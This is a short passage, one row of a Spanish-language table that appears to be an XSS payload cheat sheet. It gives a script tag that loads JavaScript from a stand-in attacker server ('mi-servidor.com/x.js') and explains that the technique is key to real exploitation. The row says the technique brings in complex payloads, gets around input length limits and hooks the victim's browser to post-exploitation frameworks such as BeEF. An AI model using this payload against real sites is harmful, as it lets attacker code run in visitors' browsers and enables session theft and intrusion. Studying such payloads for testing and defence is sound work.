...
| <br><pre><code>`<script src="https://mi-servidor.com/x.js"></script>`<br><br> |                 <br><br><br>HTML general (Carga remota).                  |        <br><br>Fundamental para la explotación real. Permite importar payloads complejos, evadir límites de longitud de caracteres en el input y conectar con frameworks de post-explotación (ej. BeEF).<br>        |
